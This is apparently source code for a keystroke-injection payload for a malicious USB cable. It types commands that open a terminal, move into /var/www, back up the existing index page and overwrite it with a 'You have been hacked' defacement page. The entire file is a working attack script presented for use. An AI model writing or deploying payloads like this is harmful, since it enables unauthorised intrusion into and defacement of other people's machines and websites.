#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("xterm");
  delay(3000);
  Keyboard.println("cd /var/www");
  delay(2000);
  Keyboard.println("mv index.* index.bak");
  delay(2000);
  Keyboard.println("touch index.html");
  delay(2000);
  Keyboard.println("nano index.html");
  delay(2000);
  Keyboard.println("<marquee><h1>You have been hacked with Evil Crow Cable V2</h1></marquee>");
  delay(2000);
  Keyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
  delay(2000);
  Keyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.write('x');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("y");
  delay(2000);
  Keyboard.println("exit");
}
